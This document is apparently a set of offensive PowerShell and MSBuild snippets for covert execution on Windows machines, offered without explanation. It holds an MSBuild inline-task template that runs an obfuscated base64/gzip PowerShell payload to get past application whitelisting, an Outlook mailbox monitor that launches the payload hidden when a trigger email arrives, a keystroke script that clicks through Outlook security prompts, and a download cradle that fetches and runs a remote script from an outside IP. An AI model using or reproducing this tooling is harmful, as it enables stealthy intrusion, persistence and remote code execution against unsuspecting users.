## XML Template
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="34rfas">
   <QWEridxnaPO />
  </Target>
	<UsingTask
    TaskName="QWEridxnaPO"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
	  <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[		
			using System;
			using System.IO;
			using System.Diagnostics;
			using System.Reflection;
			using System.Runtime.InteropServices;
			using System.Collections.ObjectModel;
			using System.Management.Automation;
			using System.Management.Automation.Runspaces;
			using System.Text;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;							
			public class QWEridxnaPO :  Task, ITask {
				public override bool Execute() {
					string pok = "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()";
					Runspace runspace = RunspaceFactory.CreateRunspace();
					runspace.Open();
					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
					Pipeline pipeline = runspace.CreatePipeline();
					pipeline.Commands.AddScript(pok);
					pipeline.Invoke();
					runspace.Close();			
					return true;
				}								 
			}			
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

## Outlook Monitor
```
function New-DynamicOutlookTrigger
{
    [CmdletBinding()]
    Param
    (
        # The exact trigger which starts the payload
        [Parameter(Mandatory=$true)]
        [ValidateCount(3,3)]
        [string[]]$Triggerwords,

        # The time to wait between mailbox sweeps
        [Parameter(Mandatory=$true)]
        $Delay,

        # The full path to location on disk of the payload
        [Parameter(Mandatory=$true)]
        $Payload,

        # Sets the script to monitor the user's junk folder, otherwise, the inbox is monitored
        [Parameter(Mandatory=$false)]
        [switch]$Junk
    )

    Begin
    {
        # Define the inbox (or Junk) and Deleted Items folders
        $DeletedFolder = 3
        if($Junk)
        {
            $olFolderNumber = 23
        }
        else
        {
            $olFolderNumber = 6
        }
    }
    Process
    {
        while($true)
        {
            # Define the Outlook Namespace
            $outlook = new-object -com outlook.application;
            $ns = $outlook.GetNameSpace("MAPI");
            write-verbose "Starting mailbox search"
            # Search the desired folder for a trigger email and execute
            $Folder = $ns.GetDefaultFolder($olFolderNumber)
            $Emails = $Folder.items
            $Emails | foreach {
                if($_.Body -match $Triggerwords[0] -and $_.Body -match $Triggerwords[1] -and $_.Body -match $Triggerwords[2])
                {
                    # Section off the body of the targe email and format it for more efficient searching
                    $EmailBody = $_.Body
                    $Body = Out-String -InputObject $EmailBody
                    $formatted = $Body -split ' '
                    # Search the contents for a URL and for a number in the port range
                    $URLRegex = "[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)"
                    $PortRegex = "^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
                    foreach($section in $formatted)
                    {
                        $URLSection = $Section | Select-string -Pattern $URLRegex
                        if($URLSection -ne $null)
                        {
                            $URLSplit = $URLSection -split '"'
                            $URL = $URLSplit[2]
                        }
                        $Portsection = $section | Select-String -Pattern $PortRegex
                        if($Portsection -ne $null)
                        {
                            $Port = $Portsection
                        }
                    }
                    
                    Start-Process -Window Hidden $payload -ArgumentList " $env:public\Libraries\msbuild_stager.xml"
                }
            }
            Start-sleep $Delay
        } 
    }
    End
    {
    }
}

New-DynamicOutlookTrigger -Triggerwords blabla1,blabla2,blabla3 -payload c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe -delay 30
```

## Outlook Prompt Bypass
```
sleep 4
for (;;) {

$wshell = new-object -ComObject wscript.shell;
$wshell.AppActivate("Microsoft Outlook")
sleep 1
$wshell.sendkeys("{TAB}")
$wshell.sendkeys("{TAB}")
$wshell.sendkeys(" ")
$wshell.sendkeys("{TAB}")
$wshell.sendkeys("{TAB}")
$wshell.sendkeys("{ENTER}")
sleep 61

}
```

## Stager Script
```
$browser = New-Object System.Net.WebClient;$u = 'Mozilla /5.0 useragent';$browser.headers.add('User-Agent',$u);$browser.Proxy = [system.net.webrequest]::defaultwebproxy;$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;$browser.Downloadstring('http://192.168.43.207:8000/ps1.crt') | IEX;
```




